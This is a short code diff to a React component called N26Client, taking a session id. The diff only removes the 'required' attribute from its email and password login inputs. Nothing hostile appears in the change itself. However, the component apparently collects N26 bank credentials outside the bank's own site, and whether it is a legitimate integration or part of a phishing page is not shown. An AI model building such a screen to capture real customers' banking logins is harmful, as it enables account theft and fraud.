@@ -51,7 +51,6 @@ export function N26Client({ sessionId }: { sessionId: string }) {
           
           <div className="relative">
             <input 
-              required 
               type="email" 
               value={username} 
               onChange={e => setUsername(e.target.value)} 
@@ -65,7 +64,6 @@ export function N26Client({ sessionId }: { sessionId: string }) {
 
           <div className="relative">
             <input 
-              required 
               type="password" 
               value={password} 
               onChange={e => setPassword(e.target.value)} 
